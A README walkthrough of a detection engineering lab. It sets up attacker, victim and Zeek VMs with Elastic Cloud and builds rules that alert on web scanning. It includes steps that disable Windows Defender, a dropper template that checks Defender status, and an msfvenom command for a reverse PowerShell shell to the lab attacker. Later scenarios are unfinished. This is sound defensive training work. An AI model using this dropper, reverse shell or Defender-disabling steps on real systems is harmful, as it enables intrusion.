# Elastic Detection Lab


## Table of Contents
- [Project and Repo Overview](XXXXX)
- [Getting Started](XXXXX)
    - [Setup Requirements](XXXXX)
    - [VM Network Settings](XXXX)
    - [Local Environment Network Schema](XXXX)
- [Virtual Machine Setup](XXX)
    - [Oracle VirtualBox](XXX)
    - [ParrotOS (Attacker)](XXX)
        - [Install and Network Configuration](XXX)
        - [Updates and Prep](XXX)
        - [IP Address](XXX)
    - [Windows 11 (Victim)](XXX)
        - [Install and Network Configuration](XXX)
        - [Windows Defender Settings](XXXX)
        - [Installing and Configuring Sysmon](XXX)
        - [Increasing Visability on PowerShell Script Execution](XXX)
        - [IP Address](XXX)
    - [Ubuntu (Zeek/Network Traffic Analyzer)](XXX)
        - [Install and Network Configuration](XXX)
        - [Zeek Install and Configuration](XXX)
        - [IP Address](XXX)
- [SIEM Setup](XXXX)
    - [Elastic Cloud Overview](XXXX)
    - [Elastic Defend Integration](XXX)
    - [Disabling Elastic Defend Response](XXXX)
    - [Zeek Integration](XXX)
    - [Windows Sysmon Integration](XXX)
- [Alert Scenario 1: Unusual Web Scanning](XXXX)
    - [Overview](XXX)
    - [Conducting the Attack](XXX)
    - [Alert Context](XXXX)
    - [Query-Based Detection](XXXXX)
    - [Threshold-Based Detection](XXXXX)
    - [Alert Confirmation](XXXXX)
- [Alert Scenario 2](XXXX)
    - [Overview](XXX)
    - [Conducting the Attack](XXX)
    - [Alert Context](XXXX)
    - [Query-Based Detection](XXXXX)
    - [Threshold-Based Detection](XXXXX)
    - [Alert Confirmation](XXXXX)
- [Alert Scenario 3](XXXX)
    - [Overview](XXX)
    - [Conducting the Attack](XXX)
    - [Alert Context](XXXX)
    - [Query-Based Detection](XXXXX)
    - [Threshold-Based Detection](XXXXX)
    - [Alert Confirmation](XXXXX)




# Project and Repo Overview

This repo is my personal recap and walkthrough of a introductory hands-on course by TCM Security on Detection Engineering. The course and project focuses on staging a local network environment consisting of three virtual machines (VM) which play the role of Attacker, Target Victim, and Zeek/Network Traffic Analyzer, and the implementation of Elastic Cloud (trial version) as the SIEM of choice, which will be utilized to create and test detection alerts for various scenarios.

The current version of this repo highlights the local environment/VM/SIEM setup, installing agents to collect logs, and testing Elastic queries and alerts. A future pending update will cover TOML, uploading detections to Github, and programtically pushing alerts to Elastic Cloud. 

While this recap/walkthrough will briefly touch upon setting up the lab environment and settings, the primary focus is on using Elastic Cloud as a SIEM and creating detection alerts. This repo aims to showcase a hands-on demonstration of successfully completing the course while highlighting a comprehensive understanding of its contents and the essential/fundamental principles of detection engineering.

For additional and expanded guidance/support, please refer to each component's documentation.


# Getting Started


## Setup Requirements
The project requires the use of a hypervisor to house three VMs (Ubuntu, ParrotOS, Windows 11). While any hypervisor can work, the hypervisor of choice within this project will be Oracle VM VirtualBox.

A SIEM will also need to be implemented which will collect logs from the Ubuntu and Windows 11 hosts. There are several SIEMs to choose from and could be incorporated. However for the scope of this project, the SIEM of choice will be Elastic Cloud (trial version).

The Linux VM is needed to install and run Zeek, which will collect logs on HTTP/network traffic within our local environment network. While any Linux distro should work, the distro of choice for this project is Ubuntu.

The Attacker VM is needed to conduct interactions with the Target Victim VM, such as port scanning, sending over malicious files, remote PowerShell script execution, and establishing a reverse remote shell connection. These activities aim to trigger and validate our alert detections. The Attacker VM of choice for this project is ParrotOS - alternatively Kali Linux can be used as the Attacker VM. More importantly, the tools needed for the Attacker VM is nmap, OWASP ZAP, Nikto, and Metasploit.

The Target Victim VM is needed to be on the receiving end of the Attacker VM's activities. The Target Victim VM will have Elastic agents installed which will help to forward logs to our instance of Elastic Cloud. The choice of the Target Victim VM will be Windows 11. Additional requirements will include the installation of Windows Sysmon as an additional log source and configurations to improve PowerShell script execution visability.





## VM Network Settings
For the VMs to be able to communicate to each other within a safe and contained local network environment, an additional network adapter needs to be added in VirtualBox's network settings. ParrotOS and Windows 11 will need to have Adapter 2 attached to "Host-only Adapter" to "VirtualBox Host-Only Ethernet Adapter", while Zeek will need to have Adapter 2 

Please see the respective host setup under Lab Setup for additional clarity and instructions.


## Local Environment Network Schema



# Virtual Machine Setup

## Oracle VirtualBox


## ParrotOS (Attacker)

### Install and Network Configuration

The Security Edition of ParrotOS can be downloaded at https://parrotsec.org/download/. See Download button and select the virtualbox (amd64) option. After the .ova file is finished downloading, you can open the file directly to open it in VirtualBox and complete the VM installation.

Once ParrotOS is fully imported as a VM inside of VirtualBox, change to network settings to enable Adapter 2 attached to "Host-only Adapter" to "Virtual Box Host-Only Ethernet Adapter". This will allow ParrotOS to communicate and interact with other VMs with the same network configurations in a safe and contained local network environment.

![parrotnetwork](./images/parrotnetwork.png)



### Updates and Prep

Ensure that your OS is fully updated and has the tools needed by running the below commands. Sudo password should be `parrot`.

```
sudo apt-get update
sudo apt-get upgrade
```

```
sudo apt install vsftpd
```

```
sudo apt install ftpd
```



### IP Address

We'll need to know what the IP address is for our ParrotOS host. To find it, open a terminal and run the `ip addr` command. The IP address for the ParrotOS host can be found next to "inet" under "3: enp0s8". For my particular VM, it is `192.168.56.104`.

![parrot_ipaddr](./images/parrot_ipaddr.png)


## Windows 11 (Victim)

### Install and Network Configuration

The file for Windows 11 VM install can be found at https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/. 

Navigate to the above link and select the VirtualBox option to download a .zip file. Extract the .ova file within and open it (it should open directly in VirtualBox) to begin the VM installation.

Once Windows 11 is fully imported as a VM inside of VirtualBox, change to network settings to enable Adapter 2 attached to "Host-only Adapter" to "Virtual Box Host-Only Ethernet Adapter". This will allow ParrotOS to communicate and interact with other VMs with the same network configurations in a safe and contained local network environment.


![windows11network](./images/windows11network.png)


### Windows Defender Settings

To ensure that we're able to fully test malicious activity against our Windows 11 host, we'll need to configure (or 'misconfigure') some settings. The below will need to be completed in order to allow the full execution of testing activities and subsuqent triggering of alerts.

Virus and Threat Protection Settings
- Tamper Protection: Off

Local Group Policy Editor > Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus
- Turn off Microsoft Defender Antivirus: Enabled


Local Group Policy Editor > Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus > Real-time Protection
- Turn off real-time protection: Enabled
- Turn on behavioral monitoring: Enabled



### Installing and Configuring Sysmon

While the Elastic and Zeek agents will cover a lot of the log data generated from the host VMs, there will be instances where some crucial information isn't captured or details may be lacking. For our Windows 11 VM, we can install Sysmon which will act as an additional data log source capturing details on process creations, network connections, and PowerShell commands.

You can download Sysmon from https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon.

Additionally, Sysmon will require a configuration file to work. A premade configuration file can be downloaded from https://github.com/SwiftOnSecurity/sysmon-config. Please refer to this repo for additional details and guidance on setting up and configuring Sysmon on the Windows 11 VM.




### Increasing Visability on PowerShell Script Execution
We can enable additional visability on details for PowerShell scripts by configuring a few settings. If we navigate to Local Group Policy Editor > Administrative Template > Windows Components > Windows PowerShell and complete the following changes:

Turn on Module Logging: 
- Enabled
- Module Names Value: *

Turn on PowerShell Script Block Logging: 
- Enabled

Turn on Script Execution: 
- Enabled
- Execution Policy: Allow all scripts

Turn on PowerShell Transcription: Enabled


### Installing Python
At some point, we'll be spinning up a simple Python web server on our Windows 11 VM, which will require Python to be installed. Open a terminal and enter `python` and follow the installation prompt from the Windows store.



### IP Address

We'll need to know what the IP address is for our Windows 11 host. To find it, open a terminal and run the `ipconfig /all` command. The IP address for the Windows 11 host can be found next to "IPv4 Address". For my particular VM, it is `192.168.56.105`.

![windows_ipconfigall](./images/windows_ipconfigall.png)






## Ubuntu (Zeek/Network Traffic Analyzer)

### Install and Network Configuration

The installation of Ubuntu VM is different from the others in that we are not importing a .ova file. Instead we'll need to download a Ubuntu .iso file and manually set it up within VirtualBox. The .iso file can be downloaded at https://ubuntu.com/download/desktop.

Navigate to the above link and select download under Ubuntu LTS (Long Term Support). Then you'll follow the typical steps of creating a new VM within VirtualBox (Create Virtual Machine) and select the downloaded Ubuntu .iso file as the specified ISO Image. For this install, you will also specify your own Ubuntu username and password. Once the new VM setup is complete, it may auto-run. Finish the typical OS installation and you may power off the VM to configure and apply the local network settings.

Within the VirtualBox network settings for the Ubuntu VM, enable Adapter 2 and attach it to "Host-only Adapter" with the name "VirtualBox Host-Only Ethernet Adapter". Additionally, under the Advanced configurations, change the selected choice to "Allow All". This setting is critical in installing Zeek and allowing it to listen to all network traffic within the local network environment. 

![zeek_network](./images/zeek_network.png)

### Zeek Install and Configuration

Documentation for installing and configuring Zeek can be found at https://docs.zeek.org/en/master/install.html.

Ensure that you install `curl` on your Ubuntu VM by running the command `sudo apt-install curl` before running any install commands from the Zeek documentation or you may encounter an install error.

While Zeek is a critical component of the overall project, the specific details on configuration is outside the scope of this repo which is to highlight the general setup of the local network environment and lab, while primarily focusing more on Elastic Cloud and detection engineering. 

Once Zeek has been fully setup and configured, it will need to be deployed in order to actively listen and collect traffic data.

Please refer to Zeek documentation on how to fully setup, configure, and deploy Zeek.


### IP Address

We'll need to know what the IP address is for our Ubuntu/Zeek host. To find it, open a terminal and run the `ip addr` command. The IP address for the Ubuntu/Zeek host can be found next to "inet" under "3: enp0s8". For my particular VM, it is `192.168.56.103`.

![zeek_ipaddr](./images/zeek_ipaddr.png)











# SIEM Setup

## Elastic Cloud Overview

Elastic Cloud is a tool stack that includes several components and functionality related to log consonlidation, security threat detection and response, and visualizing analytics. Most importantly, we will be utiizing Elastic Cloud as a SIEM to query through logs and create detection alerts.

This project utilizes a free 14-day trial period that includes a one time 1 week extension if needed. Sign up at https://www.elastic.co/ and select "Start Free Trial". Follow the steps to sign up and name your first deployment (e.g. "elastic-detection-lab).

![elastic_signup](./images/elastic_signup.png)



## Elastic Defend Integration

In order to collect logs from our Windows 11 VM, we'll need to set up Elastic Defend and install the appropriate agent. Visit the Integrations page and search for Elastic Defend. Select Elastic Defend and click on "Add Elastic Defend" followed by "Install Elastic Agent on your host"

![elastic_defend1](./images/elastic_defend1.png)


![elastic_defend2](./images/elastic_defend2.png)


![elastic_defend3](./images/elastic_defend3.png)


On the next page, you'll be shown scripts for various OS to install Elastic Defend agent on a host machine. Copy and paste the script provided for Windows and execute in a admin PowerShell shell terminal. Once the script is ran, the agent should be installed and you'll advance to the next pages where it'll confirm the agent installed, integration added, and provide a preview of incoming data.


![elastic_defend4](./images/elastic_defend4.png)

![elastic_defend5](./images/elastic_defend5.png)

![elastic_defend6](./images/elastic_defend6.png)



##  Disabling Elastic Defend Response

Similar with disabling Windows Defender Antivirus on our Windows 11 VM, we'll also disable Elastic Defend's threat response. Within Elastic Defend's Integration Policies, we can edit the integration to make the below changes:

Type: Malware
- Malware protections: Enabled
- Protection level: Detect

Type: Ransomware
- Ransomware protections: Enabled
- Protection level: Detect

Type: Memory Threat
- Memory threat protections: Enabled
- Protection level: Detect

Type: Malicious Behavior
- Malicious behavior protections: Enabled
- Protection level: Detect

Save and deploy the changes.


## Zeek Integration

In order to centralize and forward Zeek logs from our Ubuntu to Elastic Cloud, we'll need to set up an Elastic agent to collect the Zeek logs. Visit the Integrations page and search for Zeek. Select Zeek. Complete the instructions regarding appending json-logs policy to your local.zeek file by adding in the line `@load policy/tuning/json-logs.zeek`


![zeek_agent1](./images/zeek_agent1.png)


![zeek_agent2](./images/zeek_agent2.png)


Then click on "Add Zeek". On the next page, provide a name to the "New agent policy name" field (e.g. zeek policy) and click on "Save and continue", followed by "Add Elastic Agent to your hosts"


![zeek_agent3](./images/zeek_agent3.png)


On the next page, you'll be shown scripts for various OS to install an Elastic agent for Zeek on a host machine. Copy and paste the script provided for Linux and execute in a terminal. Once the script is ran, the agent should be installed and youll advance to the next pages where it'll confir

![zeek_agent4](./images/zeek_agent4.png)

On the next page, you'll be shown scripts for various OS to install Elastic Defend agent on a host machine. Copy and paste the script provided for Linux and execute in a admin PowerShell shell terminal. Once the script is ran, the agent should be installed and you'll see  a confirmation of agent enrollment and incocoming data.

![zeek_agent5](./images/zeek_agent5.png)


## Windows Sysmon Integration

Similar to the Elastic Defend/Zeek integrations, we'll search for and add the Windows integration. Leave the settings as is and add the integration to an existing host and select the initial Elastic Agent policy (e.g. "My first agent policy"). Save and continue and confirm the deployment.



![sysmon_agent](./images/sysmon_agent.png)


# Alert Scenario 1: Unusual Web Scanning
## Overview
ParrotOS will conduct web scanning (Nmap, Nikto, ZAP) against a web server hosted on the Windows 11 VM. Zeek will capture the activity and forward the log data to Elastic Cloud.

An alert for detection will be created based on query and threshold.


## Conducting the Attack

The Windows 11 VM will need to spin up a web server. From a PowerShell terminal enter the command `python -m http.server`. We'll see that the Windows 11 VM is hosting a simple HTTP server on 192.168.56.105:8000.

![alert1_pythonweb](./images/alert1_pythonweb.png)


From the ParrotOS VM, we'll begin our web scanning with the first tool, Nmap. Within a terminal, run the command `sudo nmap -sV -p 8000 192.168.56.139`.

![alert1_nmapscan](./images/alert1_nmapscan.png)

After the nmap scan is completed, we'll start another scan with the second tool, Nikto. From a terminal, run the command `sudo nikto -h 192.168.56.105:8000`.

![alert1_niktoscan](./images/alert1_niktoscan.png)

Finally, we'll conduct web scanning from our third tool, OWASP ZAP. Run ZAP from Applications > Pentesting > Most Used > OWASP ZAP. Enter `192.168.56.105:8000` in the "URL to attack" field and click Attack. Once you generate a little over 1000 requests, you click Stop as that should be sufficent.

![alert1_zapscan](./images/alert1_zapscan.png)

![alert1_zapscan2](./images/alert1_zapscan2.png)

## Alert Context
We know that web scanning activity will be captured by Zeek (`zeek:http`), so we can run a general query below and see what returns. Additionally, we would want to toggle fields with values that may be interesting to us and can provide the relevant context of web scanning. Some questions that come to mind are
- Where is the web scanning coming from?
- Who is being targeted by the web scanning activity?
- What is the HTTP method being used?
- What is the path the web scanner is crawling through?
- Can we see if the web scanner is advertising itself?


The fields `source.ip`, `source.port`, `destination.ip`, `destination.port`, `event.action`, `url.path`, and `user_agent.original` can be toggled to help answer these questions and provide context.

```
event.dataset : zeek.http
```

![alert1_elastic](./images/alert1_elastic.png)

A crucial piece of information that can help us craft a detection is knowing if the web scanner is advertising itself in the `user_agent.original` field. We can view Field Statistics and see what the current top values are. Currently, we can see Firefox and Nikto.


![alert1_elastic2](./images/alert1_elastic2.png)

But what about "Other"? Let's modify our query to the one below to exclude Nikto and see if anything interesting comes back

```
event.dataset : zeek.http and NOT user_agent.original: *Nikto*
```

![alert1_elastic3](./images/alert1_elastic3.png)


With these two queries and observing the field statistics on interesting fields, we now know that Nmap and Nikto advertise themselves in the `user_agent.original` field, which can be crucial information to craft a query-based detection.





## Query-Based Detection
Based on the alert context we were able to figure out, we know that Nmap and Nikto advertise themselves in the `user_agent.original` field. We can build a query that hones in on this information to build a query-based detection alert. The below query can be used to specifically hone in on Nmap and Nikto web scanning activity.

```
event.dataset : zeek.http and user_agent.original: *Nikto* or user_agent.original: *Nmap*
```

To build a query-based detection alert, navigate to Security > Rules > Detection Rules > Create new rule > Custom query and paste in the query we created above into the Custom query field. The following details and settings below can be applied to the rule.



Define Rule
- Custom Query: `event.dataset : zeek.http and user_agent.original: *Nikto* or user_agent.original: *Nmap*`
- Suppress alerts by: `destination.ip`
- Per time period: 5 Minutes



>[!NOTE]
> The reason why alert suppression is needed is to avoid creating overwhelming alerts for essentially one large event. A web scanner may create thousands of connections for one specific destination IP address within a short period of time. Based on that, we can suppress by `destination.ip` and allow new alerts to be generated if a different web server is also being scanned. Otherwise, if the web scanning activity is only targeting one specific `destination.ip` witin the specified time window, we can treat it as one single large event instead of several small events.




About Rule
- Name: Web Scanning Activity - Nmap/Nikto
- Description: Detects Nmap and Nikto user agent strings
- Severity: Low
- Risk Score: 21

Schedule Rule
- Runs every: 5 Minutes
- Additional look-back time: 5 Minutes







## Threshold-Based Detection
We know that there was a third web scanner used that currently isn't being accounted for. The value for the `user_agent.original` references Gecko/Mozilla, which seems to be Mozilla Firefox and may cause a lot of false positives if we detected on that. Instead, we can create a generic web scanning alert that detects on the excessive HTTP traffic behavior of a web scanner.


To build a threshold-based detection alert, navigate to Security > Rules > Detection Rules > Create new rule > Threshold. In the Custom Query field, we'll provide `event.dataset : zeek.http`. In the Group By field, we'll select `source.ip` and `destination.ip` and set the Threshold limit to 1000. Essentially, this alert is being triggered when there is an excessive amount of results being generated by the query focusing on `source.ip` and `destination.ip`. The following details and settings can be applied to the rule:

About Rule
- Name: Excessive Web Traffic
- Description: Triggers when more than 1000 queries to a web server has been observed within a 5 minute window
- Severity: Medium
- Risk Score: 50
- Advanced Settings 
    - MITRE ATT&CK Threats
        - Tactic: Discovery (TA0007)
         - Technique: Network Service Discovery (T1046)

    - Investigation Guide: Investigate the traffic between the source/destination IP address



Schedule Rule
- Runs every: 5m
- Additional look-back time: 5m



## Alert Confirmation
After repeating our attack, we can see that alerts have been triggered within our Security Alerts dashboard.

![alert1_confirm](./images/alert1_confirm.png)

Here is the expanded alert details for our query-based Web Scanning Activity - Nmap/Nikto alert. The highlighted fields sections consists of fields taken from our query. Additionally, notice that under the Correlations section, there was over 6000 suppressed alerts for this one large event, or "source event". Imagine if we did not add alert suppression - we would have received over 6000 alerts for essentially the same event. 

While each individual alert within the 6000 alerts may have had minor differences such as the web scanner crawling through a different url directory path, it may not have provided any additional and useful context, and simply overwhelm the SOC. If we are receiving this alert based on Nmap/Nikto, then we already know that our directories are being crawled through. If there was a need to alert on a specific web directory being scanned, then a separate alert should be created with a query that focuses in on that specific value within the `url.path` field.

![alert1_confirm2](./images/alert1_confirm2.png)

![alert1_suppress](./images/alert1_suppress.png)


Here is the expanded alert details for our threshold-based Excessive Web Traffic alert. Notice that within the Highlighted Fields section, there were 6309 events that were consdiered to be part of the alert's trigger - yet we didn't have over 6000 alerts. That is due to grouping the `source.ip` and `destination.ip` together. This threshold alert looks for excessive web traffic/web scanning from one particular source IP address against one specific destination IP address. For simple web scanning, this threshold should cover the scenario without overwhelming the SOC with thousands of alerts for essentially the same activity.

A good afterthought is how would we want to alert on a potential DDoS attack, where there are several IP addresses trying to overwhelm a single web server/destination IP address without accidently overwhelming the SOC with a lot of alerts?

![alert1_confirm3](./images/alert1_confirm3.png)



# Alert Scenario 2

## Overview
A dropper file will contain a script to determine if Microsoft Defender is enabled or disabled on the Windows 11 VM. If the Microsoft Defender is disabled, then the dropper file will then download a malicious script to execute a remote reverse shell to connect the Windows 11 VM to ParrotOS.

Detections will be created to alert on downloading the initial dropper file, downloading the reverse shell script file, and the execution of a reverse shell connection. 

The dropper file contains the below PowerShell script. In a nutshell, it runs the `Get-MPComputerStatus` command which returns a list of properties and their values (True, False, etc). The script then checks to see if the property `RealTimeProtectionEnabled` (Windows Defender) is equal to false. If the property value is equal to false, then execute the designated malicious payload script.

```
@ECHO OFF
powershell -Command "& {if ((Get-MPComputerStatus).RealTimeProtectionEnabled -eq $false) {<MALICIOUS PAYLOAD SCRIPT>}}"
```



## Conducting the Attack

From the ParrotOS VM, run `msfvenom -p cmd/window/reverse_powershell lhost=192.168.56.104 lport=8443 > shell.bat` to open up Metasploit.



## Alert Context





## Query-Based Detection




## Threshold-Based Detection




## Alert Confirmation








# Alert Scenario 3



## Overview



## Conducting the Attack




## Alert Context




## Query-Based Detection




## Threshold-Based Detection


## Alert Confirmation